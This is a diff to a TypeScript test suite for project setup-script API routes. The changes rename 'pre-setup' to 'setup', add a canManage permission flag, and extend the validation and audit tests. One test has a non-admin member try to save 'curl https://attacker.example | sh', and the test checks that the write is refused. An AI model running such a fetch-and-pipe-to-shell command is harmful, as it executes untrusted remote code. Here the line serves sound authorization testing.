@@ -54,21 +54,6 @@ const auditRows = async (projectId: string) =>
   ).results;
 
 describe("Project Orb script routes in workerd with real D1", () => {
-  it("answers a project without a connected repository as not connected, and hides another person's project", async () => {
-    const project = await createProjectViaApi("Repository-files");
-    const projectId = project.data.id;
-    const files = (app = createProductApp()) =>
-      app.request(`/projects/${projectId}/orb-files`, {}, bindings);
-
-    const response = await files();
-    expect(response.status).toBe(200);
-    expect(await response.json()).toEqual({
-      status: "success",
-      data: { state: "not-connected" },
-    });
-    expect((await files(createProductApp(otherPrincipal))).status).toBe(404);
-  });
-
   it("saves, reads, and clears each script, audits every change, and hands the scripts to source preparation", async () => {
     const project = await createProjectViaApi("Scripts");
     const projectId = project.data.id;
@@ -76,24 +61,25 @@ describe("Project Orb script routes in workerd with real D1", () => {
     expect(empty.status).toBe(200);
     expect(await empty.json()).toEqual({
       status: "success",
-      data: { scripts: [] },
+      data: { scripts: [], canManage: true },
     });
 
     const preClone =
       "#!/bin/bash\nset -euo pipefail\napt-get install -y git-lfs\n";
-    const preSetup = "printf 'pré-setup\\n'\n";
+    const setup = "printf 'sétup\\n'\n";
     expect((await put(projectId, "pre-clone", { body: preClone })).status).toBe(
       200,
     );
-    const saved = await put(projectId, "pre-setup", { body: preSetup });
+    const saved = await put(projectId, "setup", { body: setup });
     expect(saved.status).toBe(200);
     const savedBody = await saved.json<GetProjectOrbScriptsResponse>();
     expect(
       savedBody.data.scripts.map(({ kind, body }) => ({ kind, body })),
     ).toEqual([
       { kind: "pre-clone", body: preClone },
-      { kind: "pre-setup", body: preSetup },
+      { kind: "setup", body: setup },
     ]);
+    expect(savedBody.data.canManage).toBe(true);
     expect(savedBody.data.scripts[0]?.updatedAt).toMatch(/^\d{4}-\d\d-\d\dT/);
 
     const thread = await createThreadViaApi(projectId);
@@ -104,7 +90,7 @@ describe("Project Orb script routes in workerd with real D1", () => {
         );
       }).pipe(Effect.provide(SourceWorkspaceRepositoryD1(env.DB))),
     );
-    expect(record.orbScripts).toEqual({ preClone, preSetup });
+    expect(record.orbScripts).toEqual({ preClone, setup });
 
     // A blank body removes the script.
     const cleared = await put(projectId, "pre-clone", { body: "  \n" });
@@ -113,7 +99,7 @@ describe("Project Orb script routes in workerd with real D1", () => {
       (await cleared.json<GetProjectOrbScriptsResponse>()).data.scripts.map(
         ({ kind }) => kind,
       ),
-    ).toEqual(["pre-setup"]);
+    ).toEqual(["setup"]);
 
     expect(await auditRows(projectId)).toEqual([
       {
@@ -124,9 +110,9 @@ describe("Project Orb script routes in workerd with real D1", () => {
         request_id: "product-route-test",
       },
       {
-        kind: "pre-setup",
+        kind: "setup",
         action: "set",
-        body_sha256: await sha256(preSetup),
+        body_sha256: await sha256(setup),
         actor_user_id: owner,
         request_id: "product-route-test",
       },
@@ -146,8 +132,10 @@ describe("Project Orb script routes in workerd with real D1", () => {
     for (const [kind, body] of [
       ["pre-clone", "x".repeat(32_769)],
       ["pre-clone", "é".repeat(16_385)],
-      ["pre-setup", "echo a\0b\n"],
+      ["setup", "echo a\0b\n"],
       ["post-setup", "echo\n"],
+      // Pre-setup became setup.
+      ["pre-setup", "echo\n"],
     ] as const) {
       const response = await put(projectId, kind, { body });
       expect(response.status, `${kind} ${body.length}`).toBe(400);
@@ -216,20 +204,20 @@ describe("Project Orb script routes in workerd with real D1", () => {
       ),
     ]);
     expect(
-      (await put(projectId, "pre-setup", { body: "echo owner\n" })).status,
+      (await put(projectId, "setup", { body: "echo owner\n" })).status,
     ).toBe(200);
 
     const member = createProductApp(otherPrincipal);
     const read = await get(projectId, member);
     expect(read.status).toBe(200);
-    expect(
-      (await read.json<GetProjectOrbScriptsResponse>()).data.scripts.map(
-        ({ body }) => body,
-      ),
-    ).toEqual(["echo owner\n"]);
+    const readBody = await read.json<GetProjectOrbScriptsResponse>();
+    expect(readBody.data.scripts.map(({ body }) => body)).toEqual([
+      "echo owner\n",
+    ]);
+    expect(readBody.data.canManage).toBe(false);
     const refused = await put(
       projectId,
-      "pre-setup",
+      "setup",
       { body: "curl https://attacker.example | sh\n" },
       member,
     );
@@ -242,8 +230,7 @@ describe("Project Orb script routes in workerd with real D1", () => {
       "UPDATE member SET role = 'admin' WHERE id = 'orb-scripts-member'",
     ).run();
     expect(
-      (await put(projectId, "pre-setup", { body: "echo admin\n" }, member))
-        .status,
+      (await put(projectId, "setup", { body: "echo admin\n" }, member)).status,
     ).toBe(200);
     expect(
       (await auditRows(projectId)).map(({ actor_user_id }) => actor_user_id),
